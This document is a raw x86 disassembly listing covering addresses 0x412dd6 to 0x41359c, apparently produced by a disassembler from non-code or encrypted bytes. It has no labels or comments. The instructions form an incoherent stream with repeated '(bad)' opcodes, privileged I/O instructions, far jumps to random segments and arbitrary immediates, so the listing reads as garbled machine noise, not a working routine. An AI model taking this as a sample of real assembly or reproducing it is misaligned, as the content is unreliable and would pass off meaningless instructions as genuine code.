  412dd6:	inc    edi
  412dd7:	sahf   
  412dd8:	(bad)  
  412dd9:	mov    dl,dh
  412ddb:	jb     0x412e53
  412ddd:	push   ebx
  412dde:	inc    edx
  412ddf:	rol    dh,1
  412de1:	test   DWORD PTR [edi-0x59],0xcf8a59a
  412de8:	mov    ds:0x2e9534d4,eax
  412ded:	jae    0x412dc4
  412def:	hlt    
  412df0:	or     esp,esp
  412df2:	int3   
  412df3:	xor    ch,BYTE PTR ds:0xc42851d4
  412df9:	fsub   QWORD PTR [ecx]
  412dfb:	xchg   si,ax
  412dfd:	dec    esp
  412dfe:	cdq    
  412dff:	xor    eax,0xc758ff2f
  412e04:	sbb    edx,DWORD PTR gs:[edx+0x18584b7b]
  412e0b:	pop    ds
  412e0c:	jno    0x412df8
  412e0e:	sbb    DWORD PTR [edx],0xfc9a982c
  412e14:	inc    esi
  412e15:	lods   eax,DWORD PTR ds:[esi]
  412e16:	pop    ss
  412e17:	mov    ah,0xf8
  412e19:	pop    ss
  412e1a:	mov    ah,0x33
  412e1c:	shr    BYTE PTR [edx],cl
  412e1e:	pop    esp
  412e1f:	mov    al,0x83
  412e21:	es sti 
  412e23:	push   cs
  412e24:	out    0xd0,eax
  412e26:	cmc    
  412e27:	pop    eax
  412e28:	jl     0x412e06
  412e2a:	xchg   BYTE PTR [esi+0x49],cl
  412e2d:	lock jecxz 0x412df6
  412e30:	jbe    0x412dd2
  412e32:	xor    ah,dl
  412e34:	push   edi
  412e35:	stc    
  412e36:	push   0xffffffc2
  412e38:	xchg   DWORD PTR [edi],ecx
  412e3a:	xchg   esp,eax
  412e3b:	inc    ebp
  412e3c:	(bad)  
  412e3d:	push   edi
  412e3e:	rcl    DWORD PTR [edi-0x62],cl
  412e41:	(bad)  
  412e42:	arpl   WORD PTR [edi-0x4b42af95],si
  412e48:	mov    cs,WORD PTR [esi]
  412e4a:	inc    ebx
  412e4b:	mov    esi,DWORD PTR [edi-0x7eb0d492]
  412e51:	add    BYTE PTR cs:[ebp+0x10543eca],al
  412e58:	pop    ds
  412e59:	call   DWORD PTR [esi+0x14]
  412e5c:	shl    esi,cl
  412e5e:	lods   al,BYTE PTR ds:[esi]
  412e5f:	(bad)
  412e63:	inc    ebp
  412e64:	sbb    esp,DWORD PTR [ebx+0x70debb73]
  412e6a:	jbe    0x412dfa
  412e6c:	retf   
  412e6d:	out    dx,al
  412e6e:	cmp    eax,0xa2a2e19a
  412e73:	int    0xcf
  412e75:	sub    esi,DWORD PTR [ebx]
  412e77:	shr    DWORD PTR [ebx-0xfe1a68f],cl
  412e7d:	in     al,0x22
  412e7f:	cld    
  412e80:	lock xlat BYTE PTR ds:[ebx]
  412e82:	nop
  412e83:	lods   al,BYTE PTR ds:[esi]
  412e84:	es pushf 
  412e86:	and    eax,0xd29a4a7f
  412e8b:	ss xor al,0x1b
  412e8e:	lea    ecx,[edx]
  412e90:	mov    edx,0x46953a87
  412e95:	(bad)  
  412e96:	xor    eax,0x7a849633
  412e9b:	shr    BYTE PTR [ecx-0x63],0xb9
  412e9f:	hlt    
  412ea0:	add    al,0xbe
  412ea2:	mov    al,0xbb
  412ea4:	sub    DWORD PTR [ebx+0x29],0x1d02583e
  412eab:	cld    
  412eac:	imul   ebp,DWORD PTR [edi+0x332b6cce],0x7f999d2a
  412eb6:	push   0xd1740956
  412ebb:	pavgw  mm2,QWORD PTR [ebx+0x168f47c1]
  412ec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec3:	fcomp  DWORD PTR [edi-0xd63bff1]
  412ec9:	sub    BYTE PTR [eax],al
  412ecb:	repnz xor BYTE PTR [edi+0x2d278205],al
  412ed2:	or     edi,DWORD PTR [ebx+eiz*8-0x32]
  412ed6:	outs   dx,DWORD PTR ds:[esi]
  412ed7:	in     al,dx
  412ed8:	rol    ebp,cl
  412eda:	sbb    al,0x65
  412edc:	sub    al,0x66
  412ede:	dec    ebx
  412edf:	jp     0x412efc
  412ee1:	mov    dl,0xe
  412ee3:	int    0xa4
  412ee5:	jle    0x412f64
  412ee7:	jecxz  0x412f66
  412ee9:	lods   al,BYTE PTR ds:[esi]
  412eea:	jb     0x412f49
  412eec:	sbb    al,0x50
  412eee:	inc    ebp
  412eef:	add    ebp,ebx
  412ef1:	sbb    BYTE PTR [esi+0x4a],ah
  412ef4:	arpl   bp,bp
  412ef6:	jne    0x412f2a
  412ef8:	sub    DWORD PTR [edi-0x1e],esi
  412efb:	jg     0x412eda
  412efd:	pop    edx
  412efe:	and    ah,al
  412f00:	hlt    
  412f01:	jge    0x412ed7
  412f03:	call   0x2952ec42
  412f08:	cmc    
  412f09:	loop   0x412e8f
  412f0b:	cmp    BYTE PTR [esi],ch
  412f0d:	fdiv   st(6),st
  412f0f:	mov    ebx,0xc5b7a1d
  412f14:	pop    ss
  412f15:	aad    0x55
  412f17:	push   0xfffffff8
  412f19:	xchg   ecx,eax
  412f1a:	stc    
  412f1b:	clc    
  412f1c:	fiadd  DWORD PTR [edx+0x1f4011ad]
  412f22:	xor    edi,edi
  412f24:	aad    0xd4
  412f26:	ror    DWORD PTR [eax],0x26
  412f29:	dec    edx
  412f2a:	pop    ebp
  412f2b:	lods   al,BYTE PTR ds:[esi]
  412f2c:	loope  0x412ecc
  412f2e:	mov    ds:0x2db100e2,al
  412f33:	add    al,0x4f
  412f35:	ror    DWORD PTR [ebx],cl
  412f37:	mov    dh,0xe9
  412f39:	inc    esp
  412f3a:	in     al,dx
  412f3b:	dec    esi
  412f3c:	repz retf 
  412f3e:	into   
  412f3f:	add    al,0xd6
  412f41:	push   esi
  412f42:	adc    cl,BYTE PTR [eax+0x550fe74b]
  412f48:	add    edi,eax
  412f4a:	rol    BYTE PTR [ebx-0x4e],1
  412f4d:	ret    0xbf2a
  412f50:	cmp    edi,esi
  412f52:	nop
  412f53:	out    0x35,al
  412f55:	mov    ah,0x3a
  412f57:	out    0xf2,al
  412f59:	cmp    al,0x94
  412f5b:	add    esi,eax
  412f5d:	pusha  
  412f5e:	out    dx,eax
  412f5f:	pushf  
  412f60:	push   eax
  412f61:	mov    fs,WORD PTR [ebx-0x3]
  412f64:	bound  edx,QWORD PTR [ebp-0x5a0e7c3e]
  412f6a:	adc    cl,BYTE PTR [esi-0x46]
  412f6d:	xor    BYTE PTR [ebx-0x21],0x28
  412f71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f72:	jl     0x412fe2
  412f74:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  412f76:	and    DWORD PTR [esi+eiz*1],edx
  412f79:	fistp  QWORD PTR [ebp+0x37]
  412f7c:	mov    ch,BYTE PTR [edx+ebx*4]
  412f7f:	int3   
  412f80:	pop    ds
  412f81:	into   
  412f82:	mov    eax,0xc8949de3
  412f87:	cmp    esp,esi
  412f89:	fdiv   st(3),st
  412f8b:	sahf   
  412f8c:	fidivr WORD PTR [ebx+0x632b7612]
  412f92:	es push ds
  412f94:	mov    eax,0xebcd8c
  412f99:	ret    0x45aa
  412f9c:	cmp    eax,0x7605c709
  412fa1:	or     esp,DWORD PTR [ebp+0x4ee79c4c]
  412fa7:	sbb    BYTE PTR [ebx+0x2b],cl
  412faa:	in     eax,0x6c
  412fac:	inc    edi
  412fad:	imul   ecx,DWORD PTR [edi+ebx*4-0x46],0x7d
  412fb2:	stc    
  412fb3:	jge    0x412ff5
  412fb5:	or     eax,0xf4450d55
  412fba:	rcl    esp,1
  412fbc:	test   BYTE PTR [edx+0x19f775d8],ch
  412fc2:	scas   al,BYTE PTR es:[edi]
  412fc3:	ds iret 
  412fc5:	nop
  412fc6:	xchg   edi,eax
  412fc7:	xor    dh,cl
  412fc9:	add    al,BYTE PTR [esi]
  412fcb:	repz jno 0x412feb
  412fce:	xchg   ebp,esi
  412fd0:	mov    eax,ds:0x9b9047ec
  412fd5:	leave  
  412fd6:	loope  0x413047
  412fd8:	ficomp WORD PTR [ebp+0x16a58ad]
  412fde:	pushf  
  412fdf:	and    ebp,DWORD PTR [esi-0x39daa37a]
  412fe5:	add    ebx,ebp
  412fe7:	bound  ebx,QWORD PTR [edx]
  412fe9:	gs int3 
  412feb:	(bad)  
  412fec:	cmp    esp,DWORD PTR [esi+eax*2+0x48]
  412ff0:	fdiv   DWORD PTR [edx]
  412ff2:	into   
  412ff3:	jle    0x412fd8
  412ff5:	xor    ebp,DWORD PTR [esi-0x5b]
  412ff8:	pop    eax
  412ff9:	in     eax,dx
  412ffa:	sbb    BYTE PTR [esi-0x75],ch
  412ffd:	push   ebp
  412ffe:	nop
  412fff:	rol    BYTE PTR [esi-0x2b],cl
  413002:	mov    bl,0x67
  413004:	gs enter 0xf8f3,0x68
  413009:	mov    esp,ds
  41300b:	stos   DWORD PTR es:[edi],eax
  41300c:	ds mov ebx,esp
  41300f:	popa   
  413010:	pop    ds
  413011:	or     DWORD PTR [ebx],esp
  413013:	test   BYTE PTR [edx+ebp*1+0x5a],0x90
  413018:	dec    ebx
  413019:	fst    DWORD PTR ds:0x2672a327
  41301f:	out    dx,al
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	dec    ebx
  413022:	pushf  
  413023:	lods   al,BYTE PTR ds:[esi]
  413024:	retw   0xdc47
  413028:	stc    
  413029:	or     al,0xd2
  41302b:	and    DWORD PTR [ecx+edx*8],esp
  41302e:	ss dec ah
  413031:	mov    DWORD PTR [eax-0x18443c35],edx
  413037:	pop    eax
  413038:	fdiv   QWORD PTR [edx+0x1e]
  41303b:	dec    edi
  41303c:	and    BYTE PTR [ebp-0x67258ae4],ah
  413042:	and    BYTE PTR [esi],al
  413044:	jb     0x4130b6
  413046:	mov    esi,0x852455cb
  41304b:	xor    al,0xf1
  41304d:	retf   0x720
  413050:	adc    bl,cl
  413052:	stos   DWORD PTR es:[edi],eax
  413053:	add    ch,ch
  413055:	leave  
  413056:	sbb    BYTE PTR [ebx],bh
  413058:	dec    eax
  413059:	push   ebx
  41305a:	je     0x41300c
  41305c:	xchg   BYTE PTR [eax],bh
  41305e:	ins    DWORD PTR es:[edi],dx
  41305f:	xchg   ebx,eax
  413060:	mov    dl,0xf9
  413062:	pop    edx
  413063:	mov    edx,0xa9d0a1a2
  413068:	mov    fs,WORD PTR [ebp+0x51944a10]
  41306e:	daa    
  41306f:	out    dx,al
  413070:	mov    esi,0x64fb540c
  413075:	push   ebp
  413076:	fwait
  413077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413078:	enter  0x4fbe,0xbf
  41307c:	int3   
  41307d:	inc    ebx
  41307e:	out    0xee,eax
  413080:	jb     0x4130b6
  413082:	fdivr  QWORD PTR [edx+edx*2+0x1c]
  413086:	jp     0x4130f5
  413088:	in     al,0x8
  41308a:	xor    BYTE PTR [ebx-0x6],ah
  41308d:	out    0x38,al
  41308f:	push   cs
  413090:	cli    
  413091:	ja     0x413061
  413093:	call   0x3257da45
  413098:	mov    eax,0x3ee5c803
  41309d:	jno    0x4130b2
  41309f:	push   edx
  4130a0:	mov    dh,0x1
  4130a2:	add    ch,al
  4130a4:	rcl    BYTE PTR ds:0x2bf80bfd,cl
  4130aa:	gs in  al,0x2f
  4130ad:	or     BYTE PTR [ebx-0x63],dh
  4130b0:	or     al,BYTE PTR [ebp-0x729d90bc]
  4130b6:	mov    al,0xc3
  4130b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130b9:	mov    cl,0xf1
  4130bb:	outs   dx,BYTE PTR ds:[esi]
  4130bc:	sar    BYTE PTR [esi-0xfe93c38],cl
  4130c2:	lds    ebx,FWORD PTR [edx-0x24b77f09]
  4130c8:	mov    cl,0xe
  4130ca:	adc    DWORD PTR [edi],eax
  4130cc:	out    0xf3,al
  4130ce:	or     edx,DWORD PTR [ebx]
  4130d0:	jl     0x413080
  4130d2:	dec    esi
  4130d3:	call   0xa4d6e536
  4130d8:	lock or DWORD PTR [eax-0x3c15dbba],0x22
  4130e0:	imul   esp,ebp,0x3f44b8b6
  4130e6:	(bad)  
  4130e7:	push   ss
  4130e8:	repz leave 
  4130ea:	mov    WORD PTR [ebp+0x2e5a5fd1],cs
  4130f0:	inc    edx
  4130f1:	rcr    BYTE PTR [ecx-0x28],1
  4130f4:	push   edi
  4130f5:	popa   
  4130f6:	mov    eax,0xc7707de8
  4130fb:	imul   DWORD PTR [edx+0x2113a28b]
  413101:	mov    esp,0x5f64d76f
  413106:	shl    DWORD PTR [ecx-0x7a],cl
  413109:	or     ebx,DWORD PTR [esi+0x3d]
  41310c:	iret   
  41310d:	sti    
  41310e:	add    eax,DWORD PTR [ebp-0x29]
  413111:	je     0x413144
  413113:	rol    BYTE PTR [ebx-0xb600999],0xd5
  41311a:	sub    ch,BYTE PTR ds:0xba1699a2
  413120:	and    eax,0x96ccfd9a
  413125:	push   es
  413126:	retf   
  413127:	(bad)  
  413128:	retf   0x7d02
  41312b:	ret    0x164d
  41312e:	fimul  DWORD PTR [edi-0x32]
  413131:	add    DWORD PTR [esi],0x16c8fe41
  413137:	pop    ebx
  413138:	or     BYTE PTR ds:0x8c3f2d4c,bl
  41313e:	mov    dl,0xc8
  413140:	out    dx,al
  413141:	and    al,0x1a
  413143:	jae    0x4130de
  413145:	cmc    
  413146:	cli    
  413147:	pop    ds
  413148:	ret    
  413149:	jnp    0x4131b4
  41314b:	aas    
  41314c:	mov    ds:0x6ca34530,eax
  413151:	adc    bh,cl
  413153:	(bad)  
  413154:	pop    ebx
  413155:	jno    0x413152
  413157:	cmp    DWORD PTR ds:0xfc98fabb,edx
  41315d:	xchg   ebx,eax
  41315e:	mov    dh,0xf5
  413161:	imul   esp,DWORD PTR ds:0xb6fe7eb4,0xa97573dd
  41316b:	and    dl,bl
  41316d:	adc    dl,dh
  41316f:	jae    0x413114
  413171:	cmc    
  413172:	in     al,dx
  413173:	sbb    BYTE PTR [esi-0x52e3542e],bh
  413179:	ret    0xc934
  41317c:	or     DWORD PTR [edi+0x6e],0xd8929117
  413183:	leave  
  413184:	cs lahf 
  413186:	xchg   edi,eax
  413187:	popa   
  413188:	push   cs
  413189:	add    eax,0x1e0607f8
  41318e:	not    DWORD PTR [edi+0x1dcfcbbe]
  413194:	xchg   esp,eax
  413195:	(bad)  [ecx+0x3d]
  413198:	sbb    BYTE PTR [esi],bl
  41319a:	ret    
  41319b:	(bad)  [esi]
  41319d:	in     eax,0xcd
  41319f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131a0:	int    0x92
  4131a2:	or     DWORD PTR [ebp-0x764f59b6],edi
  4131a8:	sub    BYTE PTR [esi+0x100c3cef],bh
  4131ae:	sbb    al,0x1c
  4131b0:	jne    0x413188
  4131b2:	pop    esi
  4131b3:	push   es
  4131b4:	(bad)  
  4131b5:	cdq    
  4131b6:	ret    
  4131b7:	in     al,0x20
  4131b9:	dec    edi
  4131ba:	xor    al,0xe5
  4131bc:	mov    al,ds:0xd7bb1611
  4131c1:	jmp    0x37d0:0xfaa8c753
  4131c8:	(bad)  
  4131c9:	sub    eax,0x36ddd3d7
  4131ce:	cwde   
  4131cf:	mov    dh,0xd3
  4131d1:	dec    eax
  4131d2:	int3   
  4131d3:	shr    DWORD PTR [esp+eiz*4],0x1f
  4131d7:	mov    DWORD PTR [esi+0x69],esp
  4131da:	xchg   ebp,eax
  4131db:	into   
  4131dc:	fistp  DWORD PTR [edx+0x3bf631dd]
  4131e2:	out    0x95,eax
  4131e4:	loop   0x4131c1
  4131e6:	test   eax,0x82e47a21
  4131eb:	or     eax,DWORD PTR [edx]
  4131ed:	jnp    0x413197
  4131ef:	js     0x413179
  4131f1:	retf   
  4131f2:	or     al,0xc0
  4131f4:	push   0x17
  4131f6:	leave  
  4131f7:	ficomp WORD PTR [ecx]
  4131fa:	pop    esi
  4131fb:	fst    st(6)
  4131fd:	sbb    bh,dh
  4131ff:	cmp    ebx,DWORD PTR [eax+eiz*1]
  413202:	xor    ah,BYTE PTR [ebp-0x21]
  413205:	ins    BYTE PTR es:[edi],dx
  413206:	cwde   
  413207:	in     eax,dx
  413208:	fld    DWORD PTR [esi+0x66]
  41320b:	(bad)  
  41320c:	mov    cl,al
  41320e:	ja     0x4131e2
  413210:	clc    
  413211:	dec    esp
  413212:	vcvtsi2sd xmm5,xmm5,DWORD PTR [ebx+0x2fe54129]
  41321a:	mov    dh,0x41
  41321c:	ror    BYTE PTR [ebx],1
  41321e:	std    
  41321f:	(bad)  
  413220:	lock and DWORD PTR [esi+0x1c57d8e3],ecx
  413227:	mov    ss,ebx
  413229:	adc    DWORD PTR [edi],0x623dc13a
  41322f:	sub    al,0x3
  413231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413232:	stos   BYTE PTR es:[edi],al
  413233:	jnp    0x413211
  413235:	push   cs
  413236:	xor    al,0x12
  413238:	jmp    0x9488c268
  41323d:	mov    al,0x13
  41323f:	and    edx,eax
  413241:	test   BYTE PTR [ebp+0x1d6a6414],0xa5
  413248:	repz push eax
  41324a:	xchg   esp,eax
  41324b:	sbb    ah,BYTE PTR [ebx+0x2b]
  41324e:	shl    BYTE PTR [ebp-0x3dcc014f],cl
  413254:	ds pusha 
  413256:	cmp    bh,BYTE PTR [edi]
  413258:	push   0x5c
  41325a:	mov    bh,0x82
  41325c:	mov    ebp,0xc49e4ace
  413261:	fidiv  WORD PTR [edi]
  413263:	ficomp WORD PTR [eax+eax*1]
  413266:	mov    bh,0xc5
  413268:	mov    dl,0x20
  41326a:	dec    ebp
  41326b:	dec    ecx
  41326c:	stc    
  41326d:	sub    DWORD PTR [ebp+0x6],ebp
  413270:	aam    0x65
  413272:	out    dx,al
  413273:	arpl   WORD PTR [eax],di
  413275:	push   ds
  413276:	or     cl,BYTE PTR [ecx+0x16]
  413279:	cmc    
  41327a:	xor    cl,bh
  41327c:	inc    esi
  41327d:	xchg   esp,eax
  41327e:	adc    al,0x9d
  413280:	outs   dx,DWORD PTR ds:[esi]
  413281:	in     al,0xc9
  413283:	xor    BYTE PTR [edi+0x4ea7715a],dl
  413289:	xchg   esi,eax
  41328a:	cdq    
  41328b:	push   cs
  41328c:	out    0x52,al
  41328e:	pop    ds
  41328f:	or     DWORD PTR [edi-0x9],ebx
  413292:	and    BYTE PTR [ebp+0x5],al
  413295:	inc    edx
  413296:	pop    eax
  413297:	and    eax,0x59219d67
  41329c:	scas   eax,DWORD PTR es:[edi]
  41329d:	sbb    DWORD PTR [esi],ebx
  41329f:	jmp    0xf6d7:0xcc07b4ed
  4132a6:	mov    ds:0x87c45b5d,eax
  4132ab:	xchg   BYTE PTR [edx+0x3a],dl
  4132ae:	adc    al,cl
  4132b0:	jb     0x4132ac
  4132b2:	bound  ebp,QWORD PTR [edx]
  4132b4:	pop    edx
  4132b5:	mov    ebx,0x5ced2c67
  4132ba:	xchg   esi,ecx
  4132bc:	stc    
  4132bd:	mov    ?,WORD PTR [ecx+0x6f]
  4132c0:	mov    esi,0x109027fa
  4132c5:	pop    esi
  4132c6:	ret    
  4132c7:	pop    ebp
  4132c8:	mov    edx,0x88d6c786
  4132cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132ce:	push   edx
  4132cf:	cld    
  4132d0:	sahf   
  4132d1:	shr    BYTE PTR [ebx+eax*2+0xbd0a9ad],cl
  4132d8:	push   esp
  4132d9:	xor    eax,0xc5836597
  4132de:	sbb    al,0x47
  4132e0:	mov    edx,0xb7cc10d0
  4132e5:	lods   al,BYTE PTR ds:[esi]
  4132e6:	push   cs
  4132e7:	cmp    BYTE PTR [edi],bl
  4132e9:	or     al,0xf2
  4132eb:	and    bl,BYTE PTR [edx-0x56e971a1]
  4132f1:	call   0xaedf:0x33455636
  4132f8:	clc    
  4132f9:	and    BYTE PTR [eax-0x64e4aa67],dh
  4132ff:	int    0x78
  413301:	sbb    DWORD PTR [ebx],0xffffff99
  413304:	inc    esp
  413305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413306:	xchg   edi,eax
  413307:	jmp    0xa269:0x89ee7c10
  41330e:	cli    
  41330f:	push   esi
  413310:	cld    
  413311:	ror    BYTE PTR [ebp-0x6bcfcd5c],1
  413317:	jecxz  0x4132e9
  413319:	add    eax,0x7a62bd3e
  41331e:	fimul  DWORD PTR [esi+0x4bab4508]
  413324:	inc    ebx
  413325:	mov    DWORD PTR [edi],ebp
  413327:	jmp    0x2cc9502d
  41332c:	out    dx,al
  41332d:	and    esp,ecx
  41332f:	sbb    ebp,DWORD PTR [esp+edi*1-0xf3e9ea1]
  413336:	addr16 (bad) 
  413338:	cmp    DWORD PTR [edi+0x77],edx
  41333b:	ss mov cl,0xc7
  41333e:	push   ds
  41333f:	shl    BYTE PTR [eax+eiz*2],0xd7
  413343:	cmp    ecx,ebp
  413345:	jb     0x4133c2
  413347:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413348:	out    0xb2,eax
  41334a:	stos   BYTE PTR es:[edi],al
  41334b:	test   bh,0x98
  41334e:	inc    ebp
  41334f:	stos   DWORD PTR es:[edi],eax
  413350:	fnsave [ebx]
  413352:	dec    ebx
  413353:	push   0xf4ef7ba3
  413358:	add    al,0x2f
  41335a:	sub    BYTE PTR [edi],ch
  41335c:	stos   BYTE PTR es:[edi],al
  41335d:	out    0x25,eax
  41335f:	ss popf 
  413361:	(bad)  
  413362:	repz mov eax,0x9253ce68
  413368:	out    dx,eax
  413369:	cld    
  41336a:	pop    ebx
  41336b:	or     dh,BYTE PTR [edx-0x26]
  41336e:	stos   BYTE PTR es:[edi],al
  41336f:	mov    dh,0xd6
  413371:	or     edx,DWORD PTR [ebx-0x4c]
  413374:	ret    
  413375:	ja     0x41338f
  413377:	dec    ecx
  413378:	adc    dh,BYTE PTR [edx-0x60]
  41337b:	cli    
  41337c:	loope  0x4133c7
  41337e:	or     dh,BYTE PTR [esi-0x4fe1451c]
  413384:	rol    esi,cl
  413386:	mov    al,0x8
  413388:	mov    cl,BYTE PTR [ebp-0x6d135223]
  41338e:	dec    esi
  41338f:	push   0x12807e05
  413394:	sbb    BYTE PTR ds:0xa89ee038,0x1a
  41339b:	adc    al,BYTE PTR [ecx]
  41339d:	fidiv  WORD PTR ds:0xf4f9a28b
  4133a3:	addr16 cmp eax,0xfeb94c63
  4133a9:	or     al,0x15
  4133ab:	mov    ds:0x66b995f0,al
  4133b0:	push   esp
  4133b1:	push   esp
  4133b2:	les    ecx,FWORD PTR [edx+0x5e]
  4133b5:	push   esi
  4133b6:	icebp  
  4133b7:	aam    0x52
  4133b9:	fwait
  4133ba:	hlt    
  4133bb:	loope  0x4133ea
  4133bd:	pusha  
  4133be:	xor    eax,0x4389a860
  4133c3:	mov    bl,0x67
  4133c5:	add    al,al
  4133c7:	jnp    0x41338a
  4133c9:	pop    es
  4133ca:	ret    0xd44c
  4133cd:	and    eax,0xab1a3d10
  4133d2:	dec    esi
  4133d3:	sub    ah,bh
  4133d5:	mov    BYTE PTR [ebp-0x1b],ah
  4133d8:	shl    ch,cl
  4133da:	and    cl,BYTE PTR [ecx+0x5b1b30ee]
  4133e0:	loop   0x4133f1
  4133e2:	sub    BYTE PTR [ebx-0x5106a36f],0xaa
  4133e9:	repnz not WORD PTR [esi+edi*4+0x8]
  4133ef:	aad    0x79
  4133f1:	js     0x41342b
  4133f3:	stos   DWORD PTR es:[edi],eax
  4133f4:	and    eax,ecx
  4133f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133f7:	jnp    0x413439
  4133f9:	test   BYTE PTR [ebp+0x69ff285f],al
  4133ff:	pop    ebx
  413400:	and    ebp,DWORD PTR [ecx]
  413402:	pusha  
  413403:	jno    0x413465
  413405:	lea    ecx,[edi]
  413407:	push   es
  413408:	bound  eax,QWORD PTR [ebx-0x6a]
  41340b:	dec    eax
  41340c:	loope  0x4133e8
  41340e:	dec    ebp
  41340f:	(bad)  
  413410:	call   0xc16d:0xd0e1ee09
  413417:	dec    esp
  413418:	mov    cl,0x6d
  41341a:	push   eax
  41341b:	or     eax,0x34605e38
  413420:	push   edi
  413421:	mov    dl,0x9e
  413423:	mov    ch,BYTE PTR [esp+eiz*2-0x2280d7c2]
  41342a:	push   ebx
  41342b:	shl    BYTE PTR [edx-0x7f],cl
  41342e:	jmp    0x3fce:0x79f0909
  413435:	dec    esp
  413436:	addr16 inc ecx
  413438:	xor    ebp,esp
  41343a:	jecxz  0x413470
  41343c:	xchg   bl,cl
  41343e:	add    bl,BYTE PTR [eax]
  413440:	mov    bl,0x3e
  413442:	bound  edi,QWORD PTR [ecx]
  413444:	aaa    
  413445:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413446:	xchg   ebp,eax
  413447:	pop    edi
  413448:	cmc    
  413449:	inc    edi
  41344a:	aad    0x64
  41344c:	or     ebp,DWORD PTR cs:[ebx]
  41344f:	stc    
  413450:	daa    
  413451:	push   eax
  413452:	out    0x6a,eax
  413454:	repnz xchg ebp,eax
  413456:	sbb    al,0xa1
  413458:	fsubr  st(7),st
  41345a:	fcom   DWORD PTR [esi+edx*8+0x3f]
  41345e:	sar    ch,cl
  413460:	adc    DWORD PTR [eax+0x52],0x61
  413464:	add    DWORD PTR [ebp-0x523b50e5],ecx
  41346a:	bound  eax,QWORD PTR [edi-0x7d606b9e]
  413470:	sub    dh,BYTE PTR [edi+ecx*1]
  413473:	inc    esi
  413474:	in     al,dx
  413475:	add    BYTE PTR [edx],al
  413477:	mov    dl,0x9b
  413479:	mov    ebx,0x8ab630de
  41347e:	sub    edi,edi
  413480:	push   ss
  413481:	imul   ebp,DWORD PTR [esp+edx*4],0x6a1b2c6f
  413488:	ror    edi,cl
  41348a:	ins    DWORD PTR es:[edi],dx
  41348b:	sub    DWORD PTR [eax],0x91235e68
  413491:	clc    
  413492:	ret    
  413493:	mov    al,BYTE PTR [eax]
  413495:	shl    DWORD PTR ds:0xb2006fc5,1
  41349b:	lds    eax,FWORD PTR [edx+0x52]
  41349e:	arpl   WORD PTR ds:0xdd54bf59,bp
  4134a4:	pop    ebp
  4134a5:	loopne 0x413469
  4134a7:	or     al,0xd2
  4134a9:	nop
  4134aa:	mov    ebp,0x862d501d
  4134af:	pop    ds
  4134b0:	and    al,0x60
  4134b2:	or     dh,cl
  4134b4:	and    DWORD PTR [edi],edx
  4134b6:	pop    ds
  4134b7:	or     eax,DWORD PTR [ebx-0x77df91c1]
  4134bd:	lods   al,BYTE PTR ds:[esi]
  4134be:	jo     0x413528
  4134c0:	sti    
  4134c1:	outs   dx,BYTE PTR ds:[esi]
  4134c2:	call   0xe636219c
  4134c7:	sub    ah,BYTE PTR [edx+0x53]
  4134ca:	popf   
  4134cb:	mov    ah,BYTE PTR [edi-0x53]
  4134ce:	mov    ecx,0xf588938b
  4134d3:	pop    esi
  4134d4:	mov    gs,edi
  4134d6:	sbb    DWORD PTR [esi],ebx
  4134d8:	xor    DWORD PTR [edi+0x76],ebx
  4134db:	jl     0x4134a3
  4134dd:	mov    bl,0x63
  4134df:	jbe    0x413491
  4134e1:	cmp    ah,BYTE PTR [ebx-0x15]
  4134e4:	scas   eax,DWORD PTR es:[edi]
  4134e5:	or     al,0x88
  4134e7:	fimul  WORD PTR [ebp+0x13]
  4134ea:	or     eax,0xa62f4718
  4134ef:	pop    edi
  4134f0:	mov    ecx,0xc328ae66
  4134f5:	xchg   esi,eax
  4134f6:	inc    ebx
  4134f7:	push   eax
  4134f8:	clc    
  4134f9:	mov    eax,eax
  4134fb:	and    eax,0xbae9315a
  413500:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413501:	pop    esi
  413502:	jne    0x4134c1
  413504:	and    cl,BYTE PTR [eax+0x2587ce6d]
  41350a:	adc    DWORD PTR [esi+0x7],ecx
  41350d:	daa    
  41350e:	push   ebp
  41350f:	stos   DWORD PTR es:[edi],eax
  413510:	pusha  
  413511:	mov    edi,0xb6fcd9c
  413516:	sub    DWORD PTR [ecx+0xb61fd01],ebp
  41351c:	xor    al,0x9a
  41351e:	sbb    bh,ah
  413520:	ret    0xe95a
  413523:	pop    edx
  413524:	mov    ds:0x97234bd4,al
  413529:	pcmpeqd mm4,QWORD PTR [esi+0x57]
  41352d:	cdq    
  41352e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41352f:	adc    esp,ebx
  413531:	fidivr WORD PTR [edx-0x77]
  413534:	pop    ss
  413535:	push   edi
  413536:	stc    
  413537:	or     eax,0x6fd27b1d
  41353c:	fsubr  QWORD PTR [edx-0x3d7bcfb]
  413542:	(bad)
  413545:	in     eax,0x3f
  413547:	jp     0x413526
  413549:	bound  ebp,QWORD PTR [edx-0x1c6faca4]
  41354f:	add    cl,BYTE PTR [edi]
  413551:	sti    
  413552:	cmp    al,0xab
  413554:	mov    ebx,0x545d15a0
  413559:	je     0x41352b
  41355b:	fst    QWORD PTR [ebp+0x16]
  41355e:	je     0x413545
  413560:	add    eax,0x1e70cb54
  413565:	push   eax
  413566:	sub    DWORD PTR [edi-0x1b],eax
  413569:	shr    eax,1
  41356b:	pop    ebp
  41356c:	call   0x8750:0x949ab481
  413573:	xchg   edi,eax
  413574:	sbb    DWORD PTR [ebp+0x5b],esp
  413577:	fnstsw WORD PTR [edi+0xdf3bac]
  41357d:	sbb    BYTE PTR [edx+0x64],ch
  413580:	retf   0x2004
  413583:	jbe    0x4135a5
  413585:	repz gs loope 0x41358e
  413589:	mov    ebx,0x90f80700
  41358e:	je     0x413512
  413590:	push   cs
  413591:	pop    es
  413592:	inc    edx
  413593:	push   ss
  413594:	js     0x413542
  413596:	pop    ebp
  413597:	dec    ecx
  413598:	or     al,0x82
  41359a:	dec    ebx
  41359b:	popa   
  41359c:	mov    edi,0xf6b2a058
